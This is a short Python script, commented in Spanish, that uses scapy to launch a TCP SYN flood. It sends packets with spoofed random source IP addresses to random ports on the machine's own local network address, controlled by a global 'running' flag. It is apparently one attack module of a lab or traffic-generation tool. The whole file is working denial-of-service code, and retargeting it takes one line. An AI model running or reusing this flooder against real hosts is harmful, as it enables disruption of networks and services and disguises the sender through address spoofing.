import time
import random
import socket
from scapy.all import IP, TCP, send

running = False  # Variable global de control

def get_local_ip():
    """Obtiene la IP local de la máquina en la red"""
    try:
        # Crear un socket temporal para obtener la IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Conectar a un servidor externo para descubrir la IP
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error al obtener IP local: {e}")
        return "127.0.0.1"  # Fallback a localhost si falla

def attack():
    """Lanza un ataque TCP SYN Flooding a la IP local de la red"""
    global running
    #print("Cargado TCP SYN Flooding")

    try:
        # Obtener la IP local de la red
        target_ip = get_local_ip()
        #print(f"tcpSYN atacando a: {target_ip}")

        while True:
            packet_count = 0

            while running:
                # Generar IPs y puertos de origen aleatorios
                src_ip = random.choice([
                f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
                f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}",
                f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
                f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"  # Simulación de IPs públicas
                ])
                
                # Generar puertos de origen y destino aleatorios
                src_port = random.randint(1024, 65535)
                target_port = random.randint(1, 65535)

                # Abrimos el puerto en nuestro ordenador
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(("0.0.0.0", target_port))
                server.listen(5)

                # Crear paquete TCP con flag SYN
                ip_packet = IP(src=src_ip, dst=target_ip)
                tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")
                packet = ip_packet / tcp_packet

                # Enviar el paquete
                send(packet, verbose=False)
                server.close()
                
                #print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
                packet_count += 1
                """
                if packet_count % 200 == 0:
                    print(f"Pausa de 20 segundos... Paquetes enviados: {packet_count}")
                    time.sleep(20)
                    print("Reanudando TCP SYN Flooding")
                """
                time.sleep(0.01)  # Controla la velocidad
            time.sleep(1)

    except Exception as e:
        print(f"Error: {e}")